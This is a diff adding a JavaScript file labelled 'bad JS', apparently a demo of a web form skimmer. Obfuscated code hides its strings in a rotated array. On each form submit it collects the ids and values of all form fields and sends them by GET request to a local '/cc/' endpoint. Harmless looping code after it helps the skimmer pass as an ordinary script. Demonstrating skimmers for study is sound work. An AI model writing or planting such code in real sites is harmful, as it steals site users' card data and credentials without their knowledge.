@@ -1,0 +1,38 @@
+// This is the bad JS
+//
+//
+var angus = ["forms", "http://127.0.0.1:5000/cc/", "open", "length", " : ", "send", "addEventListener", "elements", "submit"];
+(function (sasha, rottnest) {
+  var picard = function (borg) {
+    while (--borg) {
+      sasha.push(sasha.shift());
+    }
+  };
+  picard(++rottnest);
+}(angus, 123));
+var melbourne = function (perth, quokka) {
+  perth = perth - 0;
+  var zoo = angus[perth];
+  return zoo;
+};
+document[melbourne("0x0")](melbourne("0x2"), function () {
+  var chickenrice;
+  var nero;
+  chickenrice = document[melbourne("0x3")];
+  var hiphop;
+  for (nero = 0; nero < chickenrice[melbourne("0x6")]; nero++) {
+    for (x = 0; x < chickenrice[nero][melbourne("0x1")].length; x++) {
+      hiphop += chickenrice[nero][melbourne("0x1")][x].id + melbourne("0x7") + chickenrice[nero][melbourne("0x1")][x].value + " | ";
+    }
+  }
+  alert(hiphop);
+  var zork = new XMLHttpRequest;
+  zork[melbourne("0x5")]("GET", melbourne("0x4") + hiphop, ![]);
+  zork[melbourne("0x8")]();
+});
+let total = 0;
+for (let i = 0; i < 10; i++) {
+  total += i;
+}
+console.log("Total: " + total);
+
